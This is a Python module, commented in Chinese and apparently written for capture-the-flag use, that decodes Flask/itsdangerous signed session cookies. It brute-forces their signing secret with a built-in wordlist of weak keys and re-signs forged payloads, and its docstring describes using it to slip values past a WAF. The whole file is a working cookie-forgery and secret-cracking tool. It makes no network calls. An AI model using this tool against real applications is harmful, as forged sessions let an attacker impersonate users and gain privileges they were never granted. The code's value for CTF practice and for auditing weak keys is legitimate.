# -*- coding: utf-8 -*-
"""签名会话 Cookie（Flask / itsdangerous）离线分析：解码、爆破弱密钥、重新签名。

CTF 里常见的用法是「参数被 WAF 剥字符，但会话 Cookie 里的值不经 WAF」，
这时必须能自己造一个合法签名的 Cookie。全部本地计算，不联网。
"""
import base64
import binascii
import hashlib
import hmac
import json
import re

SALT = b"cookie-session"
_HASHES = ("sha1", "md5", "sha256")


def _b64u(s):
    s = s.encode() if isinstance(s, str) else s
    return base64.urlsafe_b64decode(s + b"=" * (-len(s) % 4))


def _b64u_enc(raw):
    return base64.urlsafe_b64encode(raw).rstrip(b"=").decode()


def is_signed_session(value):
    """形如 payload.ts.signature 的 itsdangerous 时间戳签名串。"""
    if not value or value.count(".") != 2:
        return False
    head = value.split(".")[0]
    if not re.match(r"^[A-Za-z0-9_-]+$", head):
        return False
    try:
        data = _b64u(head)
    except (binascii.Error, ValueError):
        return False
    try:
        obj = json.loads(data.decode("utf-8"))
    except Exception:
        return False
    return isinstance(obj, (dict, list))


def decode(value):
    """返回 (payload_obj, ts_part, sig_part)；解析失败返回 None。"""
    parts = (value or "").split(".")
    if len(parts) != 3:
        return None
    try:
        obj = json.loads(_b64u(parts[0]).decode("utf-8"))
    except Exception:
        return None
    return obj, parts[1], parts[2]


def _derive(secret, salt, method, hash_name):
    h = getattr(hashlib, hash_name)
    if method == "concat":
        return h(secret + salt).digest()
    if method == "concat-rev":          # 只防我记错顺序
        return h(salt + secret).digest()
    if method == "django-concat":
        return h(salt + b"key" + secret).digest()
    if method == "hmac":
        return hmac.new(secret, salt, h).digest()
    return None


def _combos(secret, salt=SALT):
    sb = secret.encode("utf-8") if isinstance(secret, str) else secret
    for hash_name in _HASHES:
        for method in ("concat", "concat-rev", "django-concat", "hmac"):
            yield hash_name, method, _derive(sb, salt, method, hash_name)


def sign(payload, secret, ts_part, hash_name="sha1", method="django-concat",
         salt=SALT):
    """按给定参数重新签名；payload 可以是 dict 或已编码的 b64 段。"""
    head = payload if isinstance(payload, str) else _b64u_enc(
        json.dumps(payload, separators=(",", ":")).encode("utf-8"))
    msg = (head + "." + ts_part).encode("utf-8")
    key = _derive(secret.encode("utf-8") if isinstance(secret, str) else secret,
                  salt, method, hash_name)
    sig = _b64u_enc(hmac.new(key, msg, getattr(hashlib, hash_name)).digest())
    return "%s.%s.%s" % (head, ts_part, sig)


def crack(value, words, salt=SALT, log=None):
    """用字典逐个试签名；命中返回 (secret, hash_name, method, payload)。"""
    got = decode(value)
    if not got:
        return None
    obj, ts_part, sig = got
    head = value.split(".")[0]
    msg = (head + "." + ts_part).encode("utf-8")
    log = log or (lambda m: None)
    seen = set()
    for w in words:
        if not w or w in seen:
            continue
        seen.add(w)
        sb = w.encode("utf-8")
        for hash_name in _HASHES:
            for method in ("concat", "concat-rev", "django-concat", "hmac"):
                key = _derive(sb, salt, method, hash_name)
                cand = _b64u_enc(hmac.new(key, msg, getattr(hashlib, hash_name)).digest())
                if cand == sig:
                    log("[session] 密钥命中：%r（%s / %s）" % (w, hash_name, method))
                    return w, hash_name, method, obj
    return None


# CTF/框架里最常见的弱密钥，优先试；顺序即命中率顺序
COMMON_SECRETS = [
    "flask", "secret", "key", "SECRET", "SECRET_KEY", "secret_key", "SecretKey",
    "password", "admin", "root", "toor", "123456", "1234", "test", "dev",
    "session", "cookie", "cookie-session", "n1book", "nu1l", "nu1l.com",
    "n1code", "n1page", "afr", "afr_3", "dasctf", "DASCTF", "ctf", "ctfhub",
    "flag", "welcome", "hello", "world", "helloflask", "flasky", "app",
    "application", "changeme", "change_me", "please_change", "pleasechange",
    "sup3rs3cr3t", "s3cr3t", "supersecret", "super_secret", "mysecret",
    "my-secret-key", "your-secret-key", "your_secret_key", "secret-key",
    "keyboard cat", "cheese", "cheesecake", "secret123", "flask-secret",
    "Flask", "FlaskSECRET", "development", "production", "debug",
    "xiaodi", "abc123", "qwerty", "111", "000", "1", "123", "123456789",
    "iloveyou", "pass", "passwd", "P@ssw0rd", "Aa123456", "N1book", "Book",
]


def wordlist(extra=None):
    out = list(COMMON_SECRETS)
    if extra:
        out.extend(extra)
    return out
